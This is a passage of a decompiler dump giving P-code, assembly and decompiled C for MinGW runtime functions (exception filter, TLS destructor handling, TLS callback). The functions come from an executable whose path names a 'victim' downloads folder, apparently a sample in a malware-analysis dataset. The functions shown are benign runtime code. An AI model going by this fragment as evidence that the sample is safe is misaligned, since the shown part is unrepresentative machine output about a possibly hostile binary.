 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb00, 4) , (const, 0xc000001d, 4)
 ---  CBRANCH (ram, 0x140001f0f, 1) , (register, 0x206, 1)
 ---  BRANCHIND (unique, 0xdb00, 4)
(register, 0x0, 8) INDIRECT (const, 0x0, 8) , (const, 0xa6, 4)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0xa6, 4)
 ---  CALL (ram, 0x140002800, 8) , (const, 0x4, 4)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x1, 8)
 ---  CBRANCH (ram, 0x140002030, 1) , (register, 0x206, 1)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0xe9, 4)
 ---  CALL (ram, 0x140002800, 8) , (const, 0x4, 4)
 ---  BRANCH (ram, 0x140001f70, 1)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140001f0f, 1) , (register, 0x206, 1)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0xc0, 4)
 ---  CALLIND (register, 0x0, 8) , (const, 0x4, 8)
(register, 0x0, 8) INDIRECT (const, 0x0, 8) , (const, 0x142, 4)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0x142, 4)
 ---  CALL (ram, 0x140002800, 8) , (const, 0x8, 4)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x1, 8)
(unique, 0x10000160, 8) COPY (register, 0x0, 8)
 ---  CBRANCH (ram, 0x140001f06, 1) , (register, 0x206, 1)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0x153, 4)
 ---  CALL (ram, 0x140002800, 8) , (const, 0x8, 4)
(register, 0x0, 4) COPY (const, 0xffffffff, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x0, 8) INDIRECT (const, 0x0, 8) , (const, 0x173, 4)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0x173, 4)
 ---  CALL (ram, 0x140002800, 8) , (const, 0x8, 4)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x1, 8)
(unique, 0x10000168, 8) COPY (register, 0x0, 8)
 ---  CBRANCH (ram, 0x140002044, 1) , (register, 0x206, 1)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0x183, 4)
 ---  CALL (ram, 0x140002800, 8) , (const, 0x8, 4)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0x186, 4)
 ---  CALL (ram, 0x140001900, 8)
(register, 0x0, 4) COPY (const, 0xffffffff, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(ram, 0x1400070d0, 8) MULTIEQUAL (ram, 0x1400070d0, 8) , (ram, 0x1400070d0, 8)
(register, 0x0, 8) MULTIEQUAL (unique, 0x10000160, 8) , (unique, 0x10000168, 8)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140002010, 1) , (register, 0x206, 1)
(ram, 0x1400070d0, 8) MULTIEQUAL (ram, 0x1400070d0, 8) , (ram, 0x1400070d0, 8) , (ram, 0x1400070d0, 8) , (ram, 0x1400070d0, 8) , (ram, 0x1400070d0, 8) , (ram, 0x1400070d0, 8)
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x1400070d0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140001f90, 1) , (register, 0x206, 1)
(register, 0x0, 4) COPY (const, 0x0, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0xda, 4)
(register, 0x0, 4) CALLIND (ram, 0x1400070d0, 8) , (register, 0x8, 8)
(register, 0x0, 4) COPY (register, 0x0, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
 ---  RETURN (const, 0x1, 4) , (register, 0x0, 4)
(ram, 0x1400070d0, 8) INDIRECT (ram, 0x1400070d0, 8) , (const, 0x164, 4)
 ---  CALLIND (register, 0x0, 8) , (const, 0x8, 8)
 ---  BRANCH (ram, 0x140001f70, 1)
(ram, 0x1400070d0, 8) MULTIEQUAL (ram, 0x1400070d0, 8) , (ram, 0x1400070d0, 8) , (ram, 0x1400070d0, 8) , (ram, 0x1400070d0, 8)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
(register, 0x0, 4) COPY (const, 0xffffffff, 4)
(ram, 0x1400070d0, 8) COPY (ram, 0x1400070d0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
PUSH RBX
SUB RSP,0x20
MOV RDX,qword ptr [RCX]
MOV EAX,dword ptr [RDX]
MOV RBX,RCX
MOV ECX,EAX
AND ECX,0x20ffffff
CMP ECX,0x20474343
JZ 0x140001f80
CMP EAX,0xc0000096
JA 0x140001f0f
CMP EAX,0xc000008b
JBE 0x140001f30
ADD EAX,0x3fffff73
CMP EAX,0x9
JA 0x140001f70
LEA RDX,[0x140004480]
MOVSXD RAX,dword ptr [RDX + RAX*0x4]
ADD RAX,RDX
JMP RAX
XOR EDX,EDX
MOV ECX,0x8
CALL 0x140002800
CMP RAX,0x1
JZ 0x140002044
TEST RAX,RAX
JNZ 0x140002010
MOV RAX,qword ptr [0x1400070d0]
TEST RAX,RAX
JZ 0x140001f90
MOV RCX,RBX
ADD RSP,0x20
POP RBX
JMP RAX
CMP EAX,0xc0000005
JZ 0x140001fe0
JBE 0x140001fa0
CMP EAX,0xc0000008
JZ 0x140001f70
CMP EAX,0xc000001d
JNZ 0x140001f0f
XOR EDX,EDX
MOV ECX,0x4
CALL 0x140002800
CMP RAX,0x1
JZ 0x140002030
TEST RAX,RAX
JZ 0x140001f0f
MOV ECX,0x4
CALL RAX
NOP dword ptr [RAX]
MOV EAX,0xffffffff
JMP 0x140001f92
TEST byte ptr [RDX + 0x4],0x1
JNZ 0x140001ec1
JMP 0x140001f70
XOR EAX,EAX
ADD RSP,0x20
POP RBX
RET
CMP EAX,0x80000002
JNZ 0x140001f0f
JMP 0x140001f70
XOR EDX,EDX
MOV ECX,0x8
CALL 0x140002800
CMP RAX,0x1
JNZ 0x140001f06
MOV EDX,0x1
MOV ECX,0x8
CALL 0x140002800
JMP 0x140001f70
XOR EDX,EDX
MOV ECX,0xb
CALL 0x140002800
CMP RAX,0x1
JZ 0x14000201c
TEST RAX,RAX
JZ 0x140001f0f
MOV ECX,0xb
CALL RAX
JMP 0x140001f70
MOV ECX,0x8
CALL RAX
JMP 0x140001f70
MOV EDX,0x1
MOV ECX,0xb
CALL 0x140002800
JMP 0x140001f70
MOV EDX,0x1
MOV ECX,0x4
CALL 0x140002800
JMP 0x140001f70
MOV EDX,0x1
MOV ECX,0x8
CALL 0x140002800
CALL 0x140001900
JMP 0x140001f70




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __mingwthr_run_key_dtors
C Decompilation:

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void __mingwthr_run_key_dtors(void)

{
  __mingwthr_key_t *p_Var1;
  DWORD DVar2;
  LPVOID pvVar3;
  
  EnterCriticalSection((LPCRITICAL_SECTION)&__mingwthr_cs);
  for (p_Var1 = key_dtor_list; p_Var1 != (__mingwthr_key_t *)0x0; p_Var1 = p_Var1->next) {
    pvVar3 = TlsGetValue(p_Var1->key);
    DVar2 = GetLastError();
    if ((pvVar3 != (LPVOID)0x0) && (DVar2 == 0)) {
      (*p_Var1->dtor)(pvVar3);
    }
  }
                    /* WARNING: Could not recover jumptable at 0x0001400020c9. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  LeaveCriticalSection((LPCRITICAL_SECTION)&__mingwthr_cs);
  return;
}



Pcode Representation:
(unique, 0x10000084, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007100, 8)
(unique, 0x100000c5, 8) CAST (unique, 0x10000084, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x1d, 4)
 ---  CALL (ram, 0x1400081b8, 8) , (unique, 0x100000c5, 8)
(unique, 0x100000bd, 8) COPY (ram, 0x1400070e0, 8)
(unique, 0x100000ad, 8) MULTIEQUAL (unique, 0x100000bd, 8) , (unique, 0xdc00, 8)
(unique, 0x100000b5, 8) MULTIEQUAL (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8)
(unique, 0x100000ac, 1) INT_NOTEQUAL (unique, 0x100000ad, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x1400020bc, 1) , (unique, 0x100000ac, 1)
(unique, 0x10000094, 8) PTRSUB (unique, 0x100000ad, 8) , (const, 0x0, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000094, 8)
(ram, 0x1400070e0, 8) INDIRECT (unique, 0x100000b5, 8) , (const, 0x31, 4)
(register, 0x0, 8) CALL (ram, 0x1400081e8, 8) , (unique, 0xdb00, 4)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x36, 4)
(register, 0x0, 4) CALL (ram, 0x1400081c0, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x1400020b3, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400020b3, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRSUB (unique, 0x100000ad, 8) , (const, 0x8, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x53, 4)
 ---  CALLIND (unique, 0xdc00, 8) , (register, 0x0, 8)
(ram, 0x1400070e0, 8) MULTIEQUAL (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8)
(unique, 0x4400, 8) PTRSUB (unique, 0x100000ad, 8) , (const, 0x10, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x1000008c, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007100, 8)
(unique, 0x100000cd, 8) CAST (unique, 0x1000008c, 8)
(ram, 0x1400070e0, 8) INDIRECT (unique, 0x100000b5, 8) , (const, 0x80, 4)
 ---  CALL (ram, 0x1400081d0, 8) , (unique, 0x100000cd, 8)
(ram, 0x1400070e0, 8) COPY (ram, 0x1400070e0, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
PUSH R12
PUSH RBP
PUSH RDI
PUSH RSI
PUSH RBX
SUB RSP,0x20
LEA R12,[0x140007100]
MOV RCX,R12
CALL qword ptr [0x1400081b8]
MOV RBX,qword ptr [0x1400070e0]
TEST RBX,RBX
JZ 0x1400020bc
MOV RBP,qword ptr [0x1400081e8]
MOV RDI,qword ptr [0x1400081c0]
NOP dword ptr [RAX]
MOV ECX,dword ptr [RBX]
CALL RBP
MOV RSI,RAX
CALL RDI
TEST RSI,RSI
JZ 0x1400020b3
TEST EAX,EAX
JNZ 0x1400020b3
MOV RAX,qword ptr [RBX + 0x8]
MOV RCX,RSI
CALL RAX
MOV RBX,qword ptr [RBX + 0x10]
TEST RBX,RBX
JNZ 0x140002098
MOV RCX,R12
ADD RSP,0x20
POP RBX
POP RSI
POP RDI
POP RBP
POP R12
JMP qword ptr [0x1400081d0]




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: ___w64_mingwthr_add_key_dtor
C Decompilation:

/* WARNING: Unknown calling convention */

int ___w64_mingwthr_add_key_dtor(DWORD key,_func_void_void_ptr *dtor)

{
  __mingwthr_key_t *p_Var1;
  
  if (__mingwthr_cs_init != 0) {
    p_Var1 = (__mingwthr_key_t *)calloc(1,0x18);
    if (p_Var1 == (__mingwthr_key_t *)0x0) {
      return -1;
    }
    p_Var1->dtor = dtor;
    p_Var1->key = key;
    EnterCriticalSection((LPCRITICAL_SECTION)&__mingwthr_cs);
    p_Var1->next = key_dtor_list;
    key_dtor_list = p_Var1;
    LeaveCriticalSection((LPCRITICAL_SECTION)&__mingwthr_cs);
  }
  return 0;
}



Pcode Representation:
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x1400070e8, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400020f0, 1) , (register, 0x206, 1)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x48, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x48, 4)
(unique, 0x10000093, 8) CALL (ram, 0x1400027c0, 8) , (const, 0x1, 8) , (const, 0x18, 8)
(register, 0x0, 8) CAST (unique, 0x10000093, 8)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x14000213a, 1) , (register, 0x206, 1)
(register, 0x0, 4) COPY (const, 0xffffffff, 4)
(ram, 0x1400070e0, 8) COPY (ram, 0x1400070e0, 8)
(ram, 0x1400070e8, 4) COPY (ram, 0x1400070e8, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(unique, 0x4400, 8) PTRSUB (register, 0x0, 8) , (const, 0x8, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x56, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x56, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x4400, 8) , (register, 0x10, 8)
(unique, 0x10000073, 8) PTRSUB (register, 0x0, 8) , (const, 0x0, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x59, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x59, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000073, 8) , (register, 0x8, 4)
(unique, 0x1000005b, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007100, 8)
(unique, 0x1000009b, 8) CAST (unique, 0x1000005b, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x5e, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x5e, 4)
 ---  CALL (ram, 0x1400081b8, 8) , (unique, 0x1000009b, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x0, 8) , (const, 0x10, 8)
(unique, 0x10000083, 8) COPY (register, 0x0, 8)
(unique, 0x1000008b, 8) INDIRECT (unique, 0x10000083, 8) , (const, 0x64, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x64, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x4400, 8) , (ram, 0x1400070e0, 8)
(ram, 0x1400070e0, 8) COPY (unique, 0x1000008b, 8)
(unique, 0x10000063, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007100, 8)
(unique, 0x100000a3, 8) CAST (unique, 0x10000063, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x68, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x68, 4)
 ---  CALL (ram, 0x1400081d0, 8) , (unique, 0x100000a3, 8)
 ---  BRANCH (ram, 0x1400020e6, 1)
(ram, 0x1400070e8, 4) MULTIEQUAL (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4)
(ram, 0x1400070e0, 8) MULTIEQUAL (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8)
(ram, 0x1400070e8, 4) COPY (ram, 0x1400070e8, 4)
(ram, 0x1400070e0, 8) COPY (ram, 0x1400070e0, 8)
(register, 0x0, 4) COPY (const, 0x0, 4)
(ram, 0x1400070e0, 8) COPY (ram, 0x1400070e0, 8)
(ram, 0x1400070e8, 4) COPY (ram, 0x1400070e8, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
PUSH RDI
PUSH RSI
PUSH RBX
SUB RSP,0x20
MOV EAX,dword ptr [0x1400070e8]
MOV EDI,ECX
MOV RSI,RDX
TEST EAX,EAX
JNZ 0x1400020f0
XOR EAX,EAX
ADD RSP,0x20
POP RBX
POP RSI
POP RDI
RET
MOV EDX,0x18
MOV ECX,0x1
CALL 0x1400027c0
MOV RBX,RAX
TEST RAX,RAX
JZ 0x14000213a
MOV qword ptr [RAX + 0x8],RSI
LEA RSI,[0x140007100]
MOV dword ptr [RAX],EDI
MOV RCX,RSI
CALL qword ptr [0x1400081b8]
MOV RAX,qword ptr [0x1400070e0]
MOV RCX,RSI
MOV qword ptr [0x1400070e0],RBX
MOV qword ptr [RBX + 0x10],RAX
CALL qword ptr [0x1400081d0]
JMP 0x1400020e6
OR EAX,0xffffffff
JMP 0x1400020e8




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: ___w64_mingwthr_remove_key_dtor
C Decompilation:

/* WARNING: Unknown calling convention */

int ___w64_mingwthr_remove_key_dtor(DWORD key)

{
  __mingwthr_key_t *p_Var1;
  __mingwthr_key_t *_Memory;
  __mingwthr_key_t *p_Var2;
  
  if (__mingwthr_cs_init == 0) {
    return 0;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)&__mingwthr_cs);
  if (key_dtor_list != (__mingwthr_key_t *)0x0) {
    p_Var1 = key_dtor_list;
    p_Var2 = (__mingwthr_key_t *)0x0;
    do {
      _Memory = p_Var1;
      p_Var1 = _Memory->next;
      if (_Memory->key == key) {
        if (p_Var2 != (__mingwthr_key_t *)0x0) {
          p_Var2->next = p_Var1;
          p_Var1 = key_dtor_list;
        }
        key_dtor_list = p_Var1;
        free(_Memory);
        break;
      }
      p_Var2 = _Memory;
    } while (p_Var1 != (__mingwthr_key_t *)0x0);
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)&__mingwthr_cs);
  return 0;
}



Pcode Representation:
(register, 0x206, 1) INT_EQUAL (ram, 0x1400070e8, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140002160, 1) , (register, 0x206, 1)
(register, 0x0, 4) COPY (const, 0x0, 4)
(ram, 0x1400070e0, 8) COPY (ram, 0x1400070e0, 8)
(ram, 0x1400070e8, 4) COPY (ram, 0x1400070e8, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(unique, 0x10000061, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007100, 8)
(unique, 0x100000cc, 8) CAST (unique, 0x10000061, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x41, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x41, 4)
 ---  CALL (ram, 0x1400081b8, 8) , (unique, 0x100000cc, 8)
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x1400070e0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x1400021a3, 1) , (register, 0x206, 1)
(register, 0x10, 8) COPY (const, 0x0, 8)
(unique, 0x1000008c, 8) COPY (ram, 0x1400070e0, 8)
(unique, 0x100000a4, 8) COPY (register, 0x10, 8)
 ---  BRANCH (ram, 0x14000218b, 1)
(register, 0x10, 8) MULTIEQUAL (unique, 0x100000a4, 8) , (unique, 0x100000ac, 8)
(unique, 0x1000009c, 8) MULTIEQUAL (unique, 0x1000008c, 8) , (unique, 0x10000094, 8)
(register, 0x8, 8) COPY (unique, 0x1000009c, 8)
(unique, 0x10000071, 8) PTRSUB (register, 0x8, 8) , (const, 0x0, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000071, 8)
(register, 0x206, 1) INT_EQUAL (unique, 0xdb00, 4) , (register, 0x8, 4)
(unique, 0x4400, 8) PTRSUB (register, 0x8, 8) , (const, 0x10, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
 ---  CBRANCH (ram, 0x140002180, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdc00, 8) , (const, 0x0, 8)
(unique, 0x10000094, 8) COPY (unique, 0xdc00, 8)
(unique, 0x100000ac, 8) COPY (register, 0x8, 8)
 ---  CBRANCH (ram, 0x1400021a3, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x10, 8) , (const, 0x0, 8)
(unique, 0x100000bc, 8) COPY (unique, 0xdc00, 8)
 ---  CBRANCH (ram, 0x1400021b8, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRSUB (register, 0x10, 8) , (const, 0x10, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x76, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x76, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x4400, 8) , (unique, 0xdc00, 8)
(unique, 0x100000b4, 8) COPY (ram, 0x1400070e0, 8)
(ram, 0x1400070e8, 4) MULTIEQUAL (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4)
(unique, 0x100000c4, 8) MULTIEQUAL (unique, 0x100000b4, 8) , (unique, 0x100000bc, 8)
(ram, 0x1400070e0, 8) COPY (unique, 0x100000c4, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x79, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x79, 4)
 ---  CALL (ram, 0x1400027d8, 8) , (register, 0x8, 8)
(ram, 0x1400070e8, 4) MULTIEQUAL (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4)
(ram, 0x1400070e0, 8) MULTIEQUAL (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8)
(unique, 0x10000069, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007100, 8)
(unique, 0x100000d4, 8) CAST (unique, 0x10000069, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x7e, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x7e, 4)
 ---  CALL (ram, 0x1400081d0, 8) , (unique, 0x100000d4, 8)
(register, 0x0, 4) COPY (const, 0x0, 4)
(ram, 0x1400070e0, 8) COPY (ram, 0x1400070e0, 8)
(ram, 0x1400070e8, 4) COPY (ram, 0x1400070e8, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
PUSH RSI
PUSH RBX
SUB RSP,0x28
MOV EAX,dword ptr [0x1400070e8]
MOV EBX,ECX
TEST EAX,EAX
JNZ 0x140002160
XOR EAX,EAX
ADD RSP,0x28
POP RBX
POP RSI
RET
LEA RSI,[0x140007100]
MOV RCX,RSI
CALL qword ptr [0x1400081b8]
MOV RCX,qword ptr [0x1400070e0]
TEST RCX,RCX
JZ 0x1400021a3
XOR EDX,EDX
JMP 0x14000218b
MOV RDX,RCX
TEST RAX,RAX
JZ 0x1400021a3
MOV RCX,RAX
MOV EAX,dword ptr [RCX]
CMP EAX,EBX
MOV RAX,qword ptr [RCX + 0x10]
JNZ 0x140002180
TEST RDX,RDX
JZ 0x1400021b8
MOV qword ptr [RDX + 0x10],RAX
CALL 0x1400027d8
MOV RCX,RSI
CALL qword ptr [0x1400081d0]
XOR EAX,EAX
ADD RSP,0x28
POP RBX
POP RSI
RET
MOV qword ptr [0x1400070e0],RAX
JMP 0x14000219e




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __mingw_TLScallback
C Decompilation:

/* WARNING: Unknown calling convention */

WINBOOL __mingw_TLScallback(HANDLE hDllHandle,DWORD reason,LPVOID reserved)

{
  __mingwthr_key_t *p_Var1;
  __mingwthr_key_t *_Memory;
  
  if (reason == 2) {
    _fpreset();
    return 1;
  }
  if (reason < 3) {
    if (reason == 0) {
      if (__mingwthr_cs_init != 0) {
        __mingwthr_run_key_dtors();
      }
      if (__mingwthr_cs_init == 1) {
        __mingwthr_cs_init = 1;
        _Memory = key_dtor_list;
        while (_Memory != (__mingwthr_key_t *)0x0) {
          p_Var1 = _Memory->next;
          free(_Memory);
          _Memory = p_Var1;
        }
        key_dtor_list = (__mingwthr_key_t *)0x0;
        __mingwthr_cs_init = 0;
        DeleteCriticalSection((LPCRITICAL_SECTION)&__mingwthr_cs);
      }
    }
    else {
      if (__mingwthr_cs_init == 0) {
        InitializeCriticalSection((LPCRITICAL_SECTION)&__mingwthr_cs);
      }
      __mingwthr_cs_init = 1;
    }
  }
  else if ((reason == 3) && (__mingwthr_cs_init != 0)) {
    __mingwthr_run_key_dtors();
  }
  return 1;
}



Pcode Representation:
(register, 0x206, 1) INT_EQUAL (register, 0x10, 4) , (const, 0x2, 4)
 ---  CBRANCH (ram, 0x140002290, 1) , (register, 0x206, 1)
(unique, 0xe680, 1) INT_LESS (register, 0x10, 4) , (const, 0x3, 4)
 ---  CBRANCH (ram, 0x140002210, 1) , (unique, 0xe680, 1)
(register, 0x206, 1) INT_EQUAL (register, 0x10, 4) , (const, 0x3, 4)
 ---  CBRANCH (ram, 0x1400021fc, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x1400070e8, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400021fc, 1) , (register, 0x206, 1)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0xa6, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0xa6, 4)
 ---  CALL (ram, 0x140002060, 8)
 ---  BRANCH (ram, 0x1400021fc, 1)
(register, 0x206, 1) INT_EQUAL (register, 0x10, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140002230, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x1400070e8, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400022a0, 1) , (register, 0x206, 1)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x8a, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x8a, 4)
 ---  CALL (ram, 0x140002060, 8)
 ---  BRANCH (ram, 0x14000223a, 1)
(ram, 0x1400070e8, 4) MULTIEQUAL (ram, 0x1400070e8, 4) , (ram, 0x1400070e8, 4)
(ram, 0x1400070e0, 8) MULTIEQUAL (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8)
(register, 0x206, 1) INT_EQUAL (ram, 0x1400070e8, 4) , (const, 0x1, 4)
 ---  CBRANCH (ram, 0x1400021fc, 1) , (register, 0x206, 1)
(unique, 0x1000009c, 4) COPY (const, 0x1, 4)
(unique, 0x100000b9, 8) COPY (ram, 0x1400070e0, 8)
(unique, 0x10000088, 8) MULTIEQUAL (unique, 0x100000b9, 8) , (unique, 0x100000c1, 8)
(unique, 0x10000090, 8) MULTIEQUAL (ram, 0x1400070e0, 8) , (ram, 0x1400070e0, 8)
(unique, 0x10000098, 4) MULTIEQUAL (unique, 0x1000009c, 4) , (ram, 0x1400070e8, 4)
(unique, 0x10000087, 1) INT_NOTEQUAL (unique, 0x10000088, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140002269, 1) , (unique, 0x10000087, 1)
(unique, 0x4400, 8) PTRSUB (unique, 0x10000088, 8) , (const, 0x10, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(ram, 0x1400070e0, 8) INDIRECT (unique, 0x10000090, 8) , (const, 0x74, 4)
(ram, 0x1400070e8, 4) INDIRECT (unique, 0x10000098, 4) , (const, 0x74, 4)
 ---  CALL (ram, 0x1400027d8, 8) , (unique, 0x10000088, 8)
(unique, 0x100000c1, 8) COPY (unique, 0xdc00, 8)
(ram, 0x1400070e0, 8) COPY (const, 0x0, 8)
(ram, 0x1400070e8, 4) COPY (const, 0x0, 4)
(unique, 0x100000a1, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007100, 8)
(unique, 0x100000c9, 8) CAST (unique, 0x100000a1, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x86, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x86, 4)
 ---  CALL (ram, 0x1400081b0, 8) , (unique, 0x100000c9, 8)
 ---  BRANCH (ram, 0x1400021fc, 1)
(register, 0x206, 1) INT_EQUAL (ram, 0x1400070e8, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400022b0, 1) , (register, 0x206, 1)
(unique, 0x100000a9, 8) PTRSUB (const, 0x0, 8) , (const, 0x140007100, 8)
(unique, 0x100000d1, 8) CAST (unique, 0x100000a9, 8)
(ram, 0x1400070e0, 8) INDIRECT (ram, 0x1400070e0, 8) , (const, 0x46, 4)
(ram, 0x1400070e8, 4) INDIRECT (ram, 0x1400070e8, 4) , (const, 0x46, 4)
